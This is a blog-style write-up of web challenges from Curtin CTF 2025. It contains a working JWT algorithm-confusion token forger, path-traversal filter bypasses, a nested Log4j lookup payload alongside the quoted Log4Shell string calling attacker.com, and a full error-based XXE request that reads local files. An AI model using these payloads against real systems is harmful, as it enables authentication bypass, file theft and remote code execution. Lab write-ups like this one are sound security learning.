---
title: "Curtin CTF 2025"
date: 2025-12-07 00:00 +0800
categories: [CTF]
tags: []
image: https://github.com/user-attachments/assets/e146c663-6309-45f2-be74-732fbbf3ddc6
---

I will update more on some other challenges i sovled which in misc, forensic and osint category!

# Web 

## Agent Jonathan Walkins Trafalgar

The web app is styled like a spy‑themed mission interface. It greets you as an agent and provides a text area to paste a JWT, with two buttons: one to `Unlock Vault` and another to `Get Public Key`. The intel box reveals that the vault uses **RS256** for legitimate tokens and exposes a **/public-key** endpoint.

<img width="1616" height="958" alt="image" src="https://github.com/user-attachments/assets/ffbb77ec-7baf-4d72-bd90-4a2160875964" />

Here is an example when we `Get Public Key`: 

<img width="1079" height="661" alt="image" src="https://github.com/user-attachments/assets/b7c282bd-4e2e-4b0e-a7b1-5065aea7a439" />

This challenge was about JWT authentication.

The web app claimed to use `RS256`, which normally means only the **server’s private key** can create valid tokens, while the public key is just for checking them. Under normal circumstances, that would make it impossible for us to generate our own valid token.

However, the app was misconfigured: it also accepted tokens signed with `HS256`, and it mistakenly used the exposed public key as the secret. By switching the algorithm to `HS256` and signing with that public key string, we could forge tokens and trick the server into accepting them.

To speed things up, I used a script to automatically generate tokens with different payloads (like `{"admin": true}` or `{"role": "admin"}`).

Here's final script:

```
import json
import base64
import hmac
import hashlib

public_key = """-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

# Add \n to match public key behavior
secret = public_key + "\n" 

# Try several likely admin payloads
payloads = {
    "admin_bool_only": {"admin": True},
    "sub_admin_and_bool": {"sub": "admin", "admin": True},
    "username_admin_and_bool": {"username": "admin", "admin": True},
    "role_admin_and_bool": {"role": "admin", "admin": True},
    "isAdmin_true": {"isAdmin": True},
    "combo": {"sub": "admin", "role": "admin", "admin": True},
}

header = {"alg": "HS256", "typ": "JWT"}

def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

def make_token(payload: dict) -> str:
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg=msg, digestmod=hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"

for name, pl in payloads.items():
    print(f"\n=== {name} ===")
    print(pl)
    print(make_token(pl))
```

Try each payload:

<img width="954" height="501" alt="image" src="https://github.com/user-attachments/assets/321683bb-71c4-4d42-a873-e71fa96fd99e" />

In the end, the payload was just:
```
{
  "admin": true
}
```

I spent time overthinking different claim names, but the simplest one worked. Lesson learned: sometimes the easiest payload is all you need to unlock the vault.

<img width="1097" height="697" alt="image" src="https://github.com/user-attachments/assets/83433181-cf97-476f-974a-c92ce2b41219" />

### Flag:

```
CURTIN_CTF{alg_c0nfus10n_w1th_publ1c_k3y_1s_c00l}
```

## Adventures of Harald Part 1

In the home page, the web app brought us to another subdirectories which located at **/library/** that will let us read any books.

<img width="1919" height="964" alt="image" src="https://github.com/user-attachments/assets/857c68db-e890-4d77-bac5-a2be25ef53a7" />

From the url, straight away got me thinking about LFI.

Local File Inclusion (LFI) is a web security vulnerability that allows an attacker to include files on a server through the exploitation of vulnerable inclusion procedures in a web application. This can lead to the exposure of sensitive information

<img width="1915" height="965" alt="image" src="https://github.com/user-attachments/assets/617a1597-b606-4a5f-9371-cd85481aeabc" />

We simply redirect from reading the book to read the flag.txt that located in the web app root.

<img width="1477" height="422" alt="image" src="https://github.com/user-attachments/assets/0447650f-db3e-48e5-9b75-c82eb0479cb8" />

### Flag:
```
CURTIN_CTF{Anc13nt_S3cr3ts_&_F0rb1dd3n_L0r3!}
```

## Adventures of Harald Part 2

This had the same ui as **Adventures of Harald Part 1**, So it should be a little harder.

In the home page, the web app brought us to another subdirectories which located at **/library/** that will let us read any books.

<img width="1914" height="962" alt="image" src="https://github.com/user-attachments/assets/5924bf9d-f168-43d3-b16f-8c0771576c5c" />

<img width="1560" height="478" alt="image" src="https://github.com/user-attachments/assets/b0dbb519-307c-4fb7-97f2-c106b382f9d3" />

We simply redirect from read **book1.txt** to read the **flag.txt** that located in the **web app root** as we did before but its not working. 

<img width="1413" height="422" alt="image" src="https://github.com/user-attachments/assets/79c94535-71b3-4542-a892-dae23e3336fc" />

From the response, we can tell there’s some kind of filtering happening. When we tried `../flag.txt`, the output only showed `flag.txt` with the message:

`A glimpse into: flag.txt`

This means the ../ part was blocked by the filter.

To test how the filter works, I tried doubling the dots and slashes to see if it was removing just . and / separately, or specifically the ../ sequence. That trick bypassed the filter and that’s when we were able to read the flag.

<img width="1531" height="546" alt="image" src="https://github.com/user-attachments/assets/c2269e7a-7de9-47cf-9547-bf12e1640ce3" />

### Flag:
```
CURTIN_CTF{The_Owl_S33s_Y0ur_Cur10s1ty!}
```

## Adventures of Harald Part 3

This had the same ui as **Adventures of Harald Part 1** and **Adventures of Harald Part 2**, And this one is the last one. It should be the one that would be impossible. 

<img width="1485" height="531" alt="image" src="https://github.com/user-attachments/assets/18fd2478-20e4-48a9-9524-7e54ad0206f1" />

Again, we tried the one we use before **....//flag.txt**

<img width="1325" height="519" alt="image" src="https://github.com/user-attachments/assets/148e09f0-552c-4963-9c15-4ce0cb946e8c" />

As we can see, the response only return **//flag.txt**. However after a while i seem can't to figure how to bypass the filteration. 

That's when i tried to take a step back a bit, and try to enumerate the backend and maybe if we are lucky we could possibly try and read the source code? 

And... yes we were able to read the source code

<img width="1054" height="606" alt="image" src="https://github.com/user-attachments/assets/616f194a-3e4b-4d23-adfa-e77a0a898634" />

```
<?php
    if (isset($_GET["book"])) {
        $file_name  = $_GET["book"];

        $raw_input = $file_name;
        $sanitized_name = $file_name;
        do {
            $file_name = $sanitized_name;
            $sanitized_name = str_replace( '../', '', $file_name );
        } while ($sanitized_name !== $file_name);
        $file_name = $sanitized_name;

            if (preg_match('/^(?:\.\.\\\\\/){3}[^\/\\\\]+\.txt$/', $raw_input)) {
                $file_name = '../flag.txt';
            }
    }
?>
```
The filter is weak because it only removes ../ with forward slashes. It doesn’t block mixed separators like ..\/. So if we send:

`..\/..\/..\/flag.txt` Which means we can read the flag file.

<img width="1119" height="379" alt="image" src="https://github.com/user-attachments/assets/57d89490-5024-4a38-998c-f8d64d77a095" />

### Flag:
```
CURTIN_CTF{The_L4byr1nth_Unf0lds_B4_Y0u!}
```

<img width="1512" height="447" alt="image" src="https://github.com/user-attachments/assets/a3ffd0c9-d25a-42aa-83cc-380e28d8e052" />

## 0(nlog4)

This question brought me closer to GPT more than anyone knows. At some point it felt less like solving a CTF and more like venting to a friend who just nods along while you complain. And in the end, after all that back‑and‑forth, the solution wasn’t some genius breakthrough. It was me Googling an old writeup like a student copying homework the night before class.

<img width="829" height="689" alt="image" src="https://github.com/user-attachments/assets/2b0058af-6327-47ee-9923-de65a52d76a6" />

At the beginning, the website only showed us the `/help` page, which pointed to the /add endpoint. After intercepting the requests, we discovered there were more hidden routes like /suggest and /log. Finding those felt promising, but even with the extra endpoints nothing really revealed what the backend was doing or how the challenge was meant to be solved.

- /help (the typical manual book i would say)
- /list (list of notes printed in logs that only show the date and time)
- /add [anything] (add new notes or anything, once added it will give us the notes id in number that will add up everytime new notes is being written)
- /suggest (this one i was literally unclear how it suppose to be working, i thought it was some kind of replaying the notes however. When i feed it with the note it just, gave me something like **"Short note — try expanding with context, why it matters, and next steps."** - _EVEN AFTER I GAVE A WHOLE 10 PARAGRAPH OF LOREM IPSUM T_T._ Im begging someone please educate me more on this one!!) 

<img width="838" height="411" alt="image" src="https://github.com/user-attachments/assets/fd612a21-c33c-432d-bd3c-22121a596101" />

The challenge only had a single instance, and with so many teams hitting it at once, the server kept getting overloaded and unstable. After spending hours trying to figure out what was going on, I eventually stepped back and let others keep poking at it. At that point the instance was basically cooked, like trying to run a CTF on a microwave, so I just walked away to cool off and came back later when things weren’t burning.

After a few hours, I decided to try the challenge again. This time I searched on Google for old write‑ups or similar exploits, and that’s when I found a write‑up that matched what I was facing (exactly same ui :3). I turned to my team and said, “Don’t worry, I got this,” even though what I really had was someone else’s homework.

https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/

<img width="906" height="880" alt="Screenshot 2025-12-08 145933" src="https://github.com/user-attachments/assets/6b05d68a-2562-42ba-b76d-e1a90861c323" />

The Google CTF 2022 Log4j challenge was about exploiting logging behavior in a backend using Log4j 2.17.2. Instead of the classic Log4Shell exploit (which was patched), the challenge focused on tricking nested Log4j lookups into leaking the flag through its logging patterns.

So in short, the challenge was a twist: you could not use the famous Log4Shell exploit ${jndi:ldap://attacker.com/a}, but you had to abuse **[java Log4j’s lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup)** logging features to extract the flag.

From my understanding based on the writeups, the challenge required us to use a nested payload instead of directly reading the environment variable. The usual idea of using something like ${env:FLAG} was not enough because the patched version of Log4j blocked the straightforward routes.

Instead, the solution involved combining lookups so that one lookup would expand into another. For example, a payload such as ${java:${env:FLAG}} first resolves the inner part ${env:FLAG} to the flag value, then passes that into the outer lookup ${java:...} which gets logged. This nesting allowed the flag to be revealed through the logging process even though the direct environment lookup was restricted.

So the key point is that the challenge was not about the classic Log4Shell exploit but about abusing Log4j’s lookup features in a nested way to leak the flag.

<img width="1877" height="706" alt="Screenshot 2025-12-08 121308" src="https://github.com/user-attachments/assets/8c9fc644-dae1-4d6b-9b85-45d7f2a3c117" />

```
CURTIN_CTF{l0g4j_rce_v1a_jnd1_1nj3ct10n}
```

## Brailley

The Brailley web app takes a city name, encodes it into a numeric sequence using a custom alphabet mapping, sends that sequence to the backend, and the backend returns the location details of the nearest blind association center.

<img width="1603" height="726" alt="image" src="https://github.com/user-attachments/assets/5cdd1640-2419-4dd3-b805-8e8250b60a0a" />

From the /static/post.js

```
  var blindvalues = [
    '10',    '120',   '140',    '1450',   '150',   '1240',  '12450',
    '1250',  '240',   '2450',   '130',    '1230',  '1340',  '13450',
    '1350',  '12340', '123450', '12350',  '2340',  '23450', '1360',
    '12360', '24560', '13460',  '134560', '13560',
  ];
```
The encoding is just a letter‑to‑number substitution, where every letter A–Z has its own numeric code. The frontend converts the city name into numbers, sends it, and the backend translates it back.

We can demonstrate this through the request:
```
POST /api/search HTTP/1.1

Host: curtinctfmy-brailley.chals.io
Content-Length: 38
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: "Chromium";v="141", "Not?A_Brand";v="8"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: */*
Origin: https://curtinctfmy-brailley.chals.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://curtinctfmy-brailley.chals.io/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"message":"135601360123502401401250"}
```
Result to this response:
```
HTTP/1.1 200 OK
Server: gunicorn/19.9.0
Date: Tue, 09 Dec 2025 03:10:01 GMT
Connection: close
Content-Type: application/json; charset=utf-8
Content-Length: 134

{"ValueSearch": "Welcome! Our center is located in Brandschenkestrasse 110, 8002 Zurich, Opening hours for this center is 8:00-17:00"}
```
When you select a city like **Zurich**, the frontend script converts each letter into its numeric code:
```
Z -> 13560
U -> 1360
R -> 12350
I -> 240
C -> 140
H -> 1250
```
Concatenate these values gives `135601360123502401401250`. That encoded string is what gets sent in the request body:

```
{"message":"135601360123502401401250"}
```
The backend then decodes it back into letters and returns the location details for that city.
Now, the question is: how does this lead us to the flag? Naturally, I tried encoding the word `flag` using the same scheme and sending it as the request message:
```
{
"message":"124012301012450"
} 
```
The response was:
```
HTTP/1.1 200 OK
Server: gunicorn/19.9.0
Date: Tue, 09 Dec 2025 03:41:16 GMT
Connection: close
Content-Type: application/json; charset=utf-8
Content-Length: 34

{"ValueSearch": "No result found"}
```
I told myself: **“I’m not stopping here.”** With confidence, I tried some SQL injections like `' OR 1=1 --` thinking it might work. It didn’t.

The server responded with: _“Nice try, hengker. No 800‑point freebies today.”_

Next, I turned to GPT, hoping for help. Instead, it misled me further.

Finally, I relied on Google dorking as my last resort. That’s when I found the **[writeups](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)** I needed.

However i would explain this from my understanding, application/json if being misconfigured can led to application/xml which from this could lead to another things which is XXE injection

So we would look for **PayloadsAllTheThings** to find classis XXE payload to retrive files, However we would try with confirmed there to verify our POC

Start by switching the request from `application/json` to `application/xml` to see if the server accepts **XML input**. Then add a simple DOCTYPE declaration to confirm whether **DTDs are allowed**. Next, try a harmless internal entity to check if entity expansion works. After that, attempt an external entity such as file **:///etc/passwd** to see if external resolution is enabled. If direct output is not shown, move on to blind XXE techniques like error-based or out-of-band methods to confirm data leakage. Only after confirming each step should you proceed to the final payload for exploitation.

The final payload works by combining three parts: first an external entity to read a local file like `/flag`, then a parameter entity to embed that file’s contents, and finally an error-based expansion that forces the parser to leak the data through its error message. This chain confirms the vulnerability and allows exploitation.

```
POST /api/search HTTP/1.1
Host: curtinctfmy-brailley.chals.io
Content-Type: application/xml
Content-Length: 327

<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<message>a</message>
```

<img width="1285" height="577" alt="image" src="https://github.com/user-attachments/assets/7af038f3-5770-46e9-bc7e-b134e83bdd2f" />

```
CURTIN_CTF{⠞⠓⠼⠉_⠼⠚⠝⠑_⠺⠓⠕_⠋⠑⠼⠉⠇_⠼⠁⠞_⠁⠇⠇_⠺⠊⠞⠓⠼⠚⠥⠞_⠎⠑⠑⠼⠁⠝⠛_⠊⠞_⠼⠙⠇⠇}
```

# Yaps:

This CTF was a long ride. We played hard, learned a lot, and felt both happy and sad along the way.

Near the end, we @BlueSmurf were holding 7th place. That spot mattered because it was the last prize spot. If I had solved the last web challenge, we could have stayed there. But in the last five minutes, we dropped from 7th to 10th. The organizers said no flag hoarding, but it still happened. I don’t want to show too many screenshots or complain too much, but it hurt.

What made me sad was not just losing the place, but seeing how much time my teammates Afiq and Akmal gave to this. We stayed strong all event, moving between 1st and 7th place, fighting to keep our spot. Losing it at the end felt heavy.

It was also very tiring. On Friday evening I joined an online CTF, then at night StoutCTF started. I played from 10pm until 8:30am Saturday without sleep. I think I slept a little, then woke up around 11am to continue CurtinCTF. We kept pushing and stayed near the top until the last moment when flag hoarding knocked us down.

<img width="1523" height="594" alt="image" src="https://github.com/user-attachments/assets/1e6e6575-454c-4964-98c0-951450df2599" />

And honestly, it’s tiring to lose multiple CTFs in just two weeks in a row, especially after getting so close to prizes so many times. SherpaCTF slipped away because of my dumb careless mistake — I didn’t even check robots.txt. IBOH Stage 2 attack and defence was another heartbreak, dropping from 2nd to 7th because I didn’t patch fast enough. Then IGOH Stage 2, where I ended up 13th and played really bad. I started very, very slow, and by the time I tried to catch up it was already too late.

Even though we didn’t win any prizes, I still walked away with something valuable. Placements come and go, but the lessons stay. What matters most is the time spent learning and playing together with my teammates. We gave it our best, and even if the scoreboard didn’t end in our favor, the experience itself was worth it.

At least, now I know that even when I miss robots.txt, forget to patch, or start too slow, I can still laugh at myself and keep going. Next time, I’ll come back sharper… or at least with fewer dumb mistakes. 😅

<!--
![CTF-2025-1260x630](https://github.com/user-attachments/assets/e146c663-6309-45f2-be74-732fbbf3ddc6)
-->
